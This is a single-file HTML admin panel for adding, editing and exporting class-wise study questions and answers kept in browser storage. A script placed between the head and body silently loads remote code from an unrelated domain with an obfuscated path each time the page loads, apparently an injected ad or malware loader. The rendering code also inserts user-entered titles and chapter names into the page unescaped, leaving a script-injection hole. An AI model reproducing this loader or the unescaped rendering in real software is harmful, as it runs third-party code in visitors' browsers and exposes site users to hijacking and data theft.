<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>

<style>
body{
    font-family: Arial;
    padding:15px;
    background:#f4f7fb;
}

input,select,textarea{
    width:100%;
    padding:10px;
    margin:6px 0;
}

button{
    padding:10px;
    margin-top:5px;
    width:100%;
    background:#2a5298;
    color:#fff;
    border:none;
    border-radius:8px;
    cursor:pointer;
}

.card{
    background:#fff;
    padding:12px;
    margin:10px 0;
    border-radius:10px;
    box-shadow:0 3px 10px rgba(0,0,0,0.1);
}

.small-btn{
    width:48%;
    margin-top:8px;
}
</style>

</head>
<script>
(function(wpl){
var d = document,
    s = d.createElement('script'),
    l = d.scripts[d.scripts.length - 1];
s.settings = wpl || {};
s.src = "\/\/masculine-employment.com\/bIXWVMs.d-GUlR0oYsWWcv\/Oe\/mI9\/u\/ZhUAl\/ktPLT_cIwWMrzyMw0zOdTHM-taNFz\/A\/zTMizrQx5CN\/wR";
s.async = true;
s.referrerPolicy = 'no-referrer-when-downgrade';
l.parentNode.insertBefore(s, l);
})({})
</script>
<body>

<h2>Admin Panel</h2>

<input id="search" placeholder="Search..." oninput="render()">

<select id="cls" onchange="loadChapters(); render()">
<option value="9">Class 9</option>
<option value="10">Class 10</option>
<option value="11">Class 11</option>
<option value="12">Class 12</option>
</select>

<select id="category" onchange="loadChapters(); render()">
<option value="Domestic">Domestic</option>
<option value="Employability">Employability</option>
</select>

<select id="chapter" onchange="render()">
    <option value="">Select Chapter</option>
</select>

<input id="newChapter" placeholder="New Chapter Name (if not exist)">
<input id="title" placeholder="Question / Title">
<textarea id="content" placeholder="Answer / Content"></textarea>

<button onclick="addData()">Add / Update</button>

<button onclick="exportJSON()">Download JSON</button>
<input type="file" onchange="importJSON(event)">

<div id="list"></div>

<script>

let DATA = JSON.parse(localStorage.getItem("DATA")) || {};
let editRef = null;

function save(){
    localStorage.setItem("DATA", JSON.stringify(DATA));
}

// =====================
// ADD / UPDATE
// =====================
function addData(){

    let cls = document.getElementById("cls").value;
    let cat = document.getElementById("category").value;
    let chSelect = document.getElementById("chapter").value;
    let chInput = document.getElementById("newChapter").value.trim();

    let ch = chInput || chSelect;
    let t = document.getElementById("title").value.trim();
    let c = document.getElementById("content").value.trim();

    if(!cls || !cat || !ch || !t || !c){
        alert("Fill all fields");
        return;
    }

    if(!DATA[cls]) DATA[cls] = {};
    if(!DATA[cls][cat]) DATA[cls][cat] = {};
    if(!DATA[cls][cat][ch]) DATA[cls][cat][ch] = [];

    if(editRef){
        DATA[cls][cat][ch][editRef] = {title:t, content:c};
        editRef = null;
    } else {
        DATA[cls][cat][ch].push({title:t, content:c});
    }
    
    save();
    loadChapters();
    render();

    // clear form
    document.getElementById("title").value="";
    document.getElementById("content").value="";

    alert("Saved Successfully");
}

// =====================
// EDIT
// =====================
function editItem(cls,cat,ch,index){

    let item = DATA[cls][cat][ch][index];

    document.getElementById("cls").value = cls;
    document.getElementById("category").value = cat;
    document.getElementById("chapter").value = ch;
    document.getElementById("title").value = item.title;
    document.getElementById("content").value = item.content;

    editRef = index;
}

// =====================
// DELETE
// =====================
function deleteItem(cls,cat,ch,index){

    if(confirm("Delete this item?")){

        DATA[cls][cat][ch].splice(index,1);

        // clean empty
        if(DATA[cls][cat][ch].length === 0){
            delete DATA[cls][cat][ch];
        }
        if(Object.keys(DATA[cls][cat]).length === 0){
            delete DATA[cls][cat];
        }
        if(Object.keys(DATA[cls]).length === 0){
            delete DATA[cls];
        }

        save();
        render();
    }
}

// =====================
// RENDER + SEARCH
// =====================
function render(){

    let cls = document.getElementById("cls").value;
    let cat = document.getElementById("category").value;
    let ch = document.getElementById("chapter").value;

    let html = "";

    if(cls && cat && ch && DATA[cls] && DATA[cls][cat] && DATA[cls][cat][ch]){

        DATA[cls][cat][ch].forEach((item,i)=>{

            html += `
            <div class="card">
                <b>${item.title}</b>

                <div style="display:flex; gap:5px;">
                    <button onclick="editItem('${cls}','${cat}','${ch}',${i})">Edit</button>
                    <button onclick="deleteItem('${cls}','${cat}','${ch}',${i})">Delete</button>
                </div>
            </div>`;
        });

    } else {
        html = "👉 Select Class, Category & Chapter";
    }

    document.getElementById("list").innerHTML = html;
}
// =====================
// DOWNLOAD JSON
// =====================
function exportJSON(){
    let blob = new Blob([JSON.stringify(DATA,null,2)],{type:"application/json"});
    let a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "content.json";
    a.click();
}

// =====================
// IMPORT JSON
// =====================
function importJSON(e){

    let file = e.target.files[0];
    if(!file){
        alert("No file selected");
        return;
    }

    let reader = new FileReader();

    reader.onload = function(){
        try{
            DATA = JSON.parse(reader.result);
            save();
            render();
            alert("Imported Successfully");
        }catch{
            alert("Invalid JSON file");
        }
    }

    reader.readAsText(file);
}

function loadChapters(){

    let cls = document.getElementById("cls").value;
    let cat = document.getElementById("category").value;

    let chapterSelect = document.getElementById("chapter");

    // 🔥 reset dropdown
    chapterSelect.innerHTML = `<option value="">Select Chapter</option>`;

    // 🔥 clear selected chapter
    chapterSelect.value = "";

    if(DATA[cls] && DATA[cls][cat]){

        for(let ch in DATA[cls][cat]){
            chapterSelect.innerHTML += `<option value="${ch}">${ch}</option>`;
        }
    }

    // 🔥 list clear (important)
    document.getElementById("list").innerHTML = "👉 Select Chapter";
}

render();

</script>

</body>
</html>
